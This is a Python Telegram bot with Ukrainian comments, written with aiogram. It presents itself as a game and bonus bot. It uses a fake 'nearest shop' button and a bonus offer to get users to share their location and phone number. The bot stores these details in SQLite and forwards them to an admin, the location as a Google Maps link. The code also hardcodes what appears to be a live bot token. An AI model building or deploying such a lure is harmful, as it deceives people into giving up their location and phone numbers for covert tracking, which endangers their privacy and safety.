import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import sqlite3
from datetime import datetime
import asyncio

# Налаштування (НЕ ВИКОРИСТОВУЙТЕ МОЇ ПРИКЛАДИ, ВСТАВТЕ СВОЇ ДАНІ)
TOKEN = "8088196156:AAGq9vJ9_GY1-qk31iys65dKb-VFoqhDezE"  # Отримайте у @BotFather
ADMIN_ID = 1723822907 # Ваш Telegram ID (дізнатись у @userinfobot)

# Правильна ініціалізація бота для aiogram 3.7.0+
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
logging.basicConfig(level=logging.INFO)

# Ініціалізація БД
def init_db():
    with sqlite3.connect('user_data.db') as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS users
                      (user_id INTEGER PRIMARY KEY,
                       username TEXT,
                       first_name TEXT,
                       last_name TEXT,
                       phone TEXT,
                       latitude REAL,
                       longitude REAL,
                       last_seen TEXT)''')

init_db()

# Клавіатура
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎮 Почати гру")],
            [KeyboardButton(text="🎁 Отримати бонус")],
            [KeyboardButton(text="📍 Найближчий магазин", request_location=True)]
        ],
        resize_keyboard=True
    )

# Обробник /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user = message.from_user
    with sqlite3.connect('user_data.db') as conn:
        conn.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                   (user.id, user.username, user.first_name, user.last_name, 
                    None, None, None, datetime.now().isoformat()))
    
    await message.answer(
        f"👋 Вітаємо, <b>{user.first_name}</b>!\n"
        "Оберіть дію з меню:",
        reply_markup=get_main_keyboard()
    )
    await bot.send_message(
        ADMIN_ID,
        f"🆕 Новий користувач:\n"
        f"ID: {user.id}\n"
        f"Ім'я: {user.first_name}\n"
        f"Юзер: @{user.username}"
    )

# Обробник геолокації
@dp.message(lambda m: m.location is not None)
async def handle_location(message: types.Message):
    user = message.from_user
    loc = message.location
    with sqlite3.connect('user_data.db') as conn:
        conn.execute("UPDATE users SET latitude=?, longitude=?, last_seen=? WHERE user_id=?",
                   (loc.latitude, loc.longitude, datetime.now().isoformat(), user.id))
    
    await message.answer(
        "🏪 Найближчий магазин за 300 метрів!",
        reply_markup=get_main_keyboard()
    )
    await bot.send_message(
        ADMIN_ID,
        f"📍 Геолокація від {user.first_name}:\n"
        f"https://maps.google.com/?q={loc.latitude},{loc.longitude}"
    )

# Обробник кнопки "Отримати бонус"
@dp.message(lambda m: m.text == "🎁 Отримати бонус")
async def ask_for_contact(message: types.Message):
    await message.answer(
        "Для отримання бонусу нам потрібен ваш номер:",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton("📱 Надіслати номер", request_contact=True)]],
            resize_keyboard=True
        )
    )

# Обробник контакту
@dp.message(lambda m: m.contact is not None)
async def handle_contact(message: types.Message):
    user = message.from_user
    contact = message.contact
    with sqlite3.connect('user_data.db') as conn:
        conn.execute("UPDATE users SET phone=?, last_seen=? WHERE user_id=?",
                   (contact.phone_number, datetime.now().isoformat(), user.id))
    
    await message.answer(
        "✅ Дякуємо! Бонус активовано.",
        reply_markup=get_main_keyboard()
    )
    await bot.send_message(
        ADMIN_ID,
        f"📱 Отримано контакт:\n"
        f"Ім'я: {contact.first_name}\n"
        f"Телефон: {contact.phone_number}"
    )

# Команда для адміна
@dp.message(Command("stats"))
async def cmd_stats(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.answer("⛔ Доступ заборонено")
    
    with sqlite3.connect('user_data.db') as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
        with_phone = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM users WHERE latitude IS NOT NULL")
        with_loc = cursor.fetchone()[0]
        
        cursor.execute("SELECT first_name, last_seen FROM users ORDER BY last_seen DESC LIMIT 5")
        recent = cursor.fetchall()
    
    stats = (
        "📊 <b>Статистика бота</b>\n\n"
        f"👥 Користувачів: <b>{total}</b>\n"
        f"📱 З номерами: <b>{with_phone}</b>\n"
        f"📍 З локаціями: <b>{with_loc}</b>\n\n"
        "⏳ <b>Останні відвідувачі:</b>\n"
    )
    
    for user in recent:
        stats += f"- {user[0]} ({datetime.fromisoformat(user[1]).strftime('%d.%m %H:%M')})\n"
    
    await message.answer(stats)

# Запуск бота
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())